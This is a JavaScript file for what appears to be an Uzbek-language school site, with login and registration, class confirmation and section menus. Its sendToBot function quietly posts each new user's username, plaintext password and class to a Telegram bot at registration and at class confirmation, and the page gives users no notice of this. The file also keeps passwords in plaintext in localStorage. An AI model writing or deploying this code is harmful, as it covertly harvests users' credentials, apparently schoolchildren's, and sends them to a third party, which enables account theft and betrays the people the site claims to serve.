/* ================== SOZLAMALAR ================== */
const BOT_TOKEN = "YOUR_BOT_TOKEN"; // ⚠️ frontendda haqiqiy token qo‘ymang
const CHAT_ID = "YOUR_CHAT_ID";

/* ================== O‘ZGARUVCHILAR ================== */
let users = JSON.parse(localStorage.getItem("users") || "{}");
let currentAction = "login";
let currentUser = null;

/* ================== MODAL ================== */
function openModal(action) {
  currentAction = action;
  document.getElementById("modal-bg").style.display = "flex";
  document.getElementById("modal-title").innerText =
    action === "login" ? "Kirish" : "Ro‘yxatdan o‘tish";
  document.getElementById("modal-msg").innerText = "";
  document.getElementById("username").value = "";
  document.getElementById("password").value = "";
}

/* ================== LOGIN / REGISTER ================== */
function submitForm() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const msg = document.getElementById("modal-msg");

  if (username === "" || password === "") {
    msg.style.color = "#f55";
    msg.innerText = "Iltimos, barcha maydonlarni to‘ldiring!";
    return;
  }

  if (currentAction === "register") {
    if (users[username]) {
      msg.style.color = "#f55";
      msg.innerText = "Foydalanuvchi allaqachon mavjud!";
    } else {
      users[username] = password;
      localStorage.setItem("users", JSON.stringify(users));
      currentUser = username;
      showWelcome(username);
      sendToBot(username, password);
      msg.style.color = "lime";
      msg.innerText = "Ro‘yxatdan o‘tish muvaffaqiyatli!";
      setTimeout(() => {
        document.getElementById("modal-bg").style.display = "none";
      }, 500);
    }
  } else {
    if (users[username] && users[username] === password) {
      currentUser = username;
      showWelcome(username);
      document.getElementById("modal-bg").style.display = "none";
    } else {
      msg.style.color = "#f55";
      msg.innerText = "Ism yoki parol xato!";
    }
  }
}

/* ================== WELCOME ================== */
function showWelcome(username) {
  document.getElementById("menu").style.display = "none";
  const welcome = document.getElementById("welcome-msg");
  const confirmBtn = document.getElementById("confirm-class-btn");

  welcome.style.display = "block";
  const userClass = localStorage.getItem("userClass_" + username);

  if (userClass) {
    welcome.innerText = `Xush kelibsiz, ${username} (${userClass})`;
    confirmBtn.style.display = "none";
  } else {
    welcome.innerText = `Xush kelibsiz, ${username}`;
    confirmBtn.style.display = "inline-block";
  }
}

/* ================== CLASS TASDIQLASH ================== */
function confirmClass() {
  if (!currentUser) return;

  const className = prompt("Sinfingizni kiriting (masalan: 10A):");
  if (className && className.trim() !== "") {
    localStorage.setItem("userClass_" + currentUser, className.trim());
    showWelcome(currentUser);
    alert("Sinf tasdiqlandi: " + className);
    sendToBot(currentUser, users[currentUser], className.trim());
  }
}

/* ================== TELEGRAMGA YUBORISH ================== */
function sendToBot(username, password, userClass = null) {
  let text = `Yangi foydalanuvchi:
Ism: ${username}
Parol: ${password}`;

  if (userClass) {
    text += `\nSinf: ${userClass}`;
  }

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
    }),
  })
    .then(() => console.log("Botga yuborildi"))
    .catch((err) => console.error(err));
}

/* ================== BO‘LIMLAR ================== */
function selectSection(section) {
  const mainSection = document.getElementById("main-section");
  const newsSection = document.getElementById("news-section");

  if (section === "news") {
    mainSection.style.display = "none";
    newsSection.style.display = "block";
    return;
  }

  const itCard = document.getElementById("it-card");
  const cyberCard = document.getElementById("cyber-card");
  const newsCard = document.getElementById("news-card");

  itCard.style.opacity = "1";
  cyberCard.style.opacity = "1";
  newsCard.style.opacity = "1";

  itCard.style.pointerEvents = "auto";
  cyberCard.style.pointerEvents = "auto";
  newsCard.style.pointerEvents = "auto";

  if (section === "it") {
    cyberCard.style.opacity = "0.5";
    newsCard.style.opacity = "0.5";
    cyberCard.style.pointerEvents = "none";
    newsCard.style.pointerEvents = "none";
    alert("IT bo‘limiga o‘tildi");
  }

  if (section === "cyber") {
    itCard.style.opacity = "0.5";
    newsCard.style.opacity = "0.5";
    itCard.style.pointerEvents = "none";
    newsCard.style.pointerEvents = "none";
    alert("Cybersport bo‘limiga o‘tildi");
  }
}

function backToMain() {
  document.getElementById("news-section").style.display = "none";
  document.getElementById("main-section").style.display = "block";
}

/* ================== MODAL TASHQARISIGA BOSISH ================== */
document.getElementById("modal-bg").addEventListener("click", function (e) {
  if (e.target === this) this.style.display = "none";
});

/* ================== OXIRGI USER ================== */
const savedUsers = Object.keys(users);
if (savedUsers.length > 0) {
  const lastUser = savedUsers[savedUsers.length - 1];
  currentUser = lastUser;
  showWelcome(lastUser);
}
